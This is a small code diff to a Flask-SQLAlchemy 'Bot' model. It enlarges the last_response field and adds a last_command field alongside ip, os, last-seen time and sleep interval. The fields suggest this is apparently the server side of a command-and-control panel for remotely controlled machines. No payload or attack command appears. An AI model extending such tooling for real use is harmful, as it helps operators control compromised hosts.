@@ -29,9 +29,10 @@ class Bot(db.Model):
     id = db.Column(db.Integer(), primary_key=True)
     ip = db.Column(db.String(50))
     os = db.Column(db.String(50))
-    last_response = db.Column(db.String(5000))
+    last_response = db.Column(db.String(10000))
     last_seen_time = db.Column(db.DateTime())
     sleep_interval = db.Column(db.Integer())
+    last_command = db.Column(db.String(10000))
 
     def __str__(self):
         return self.ip
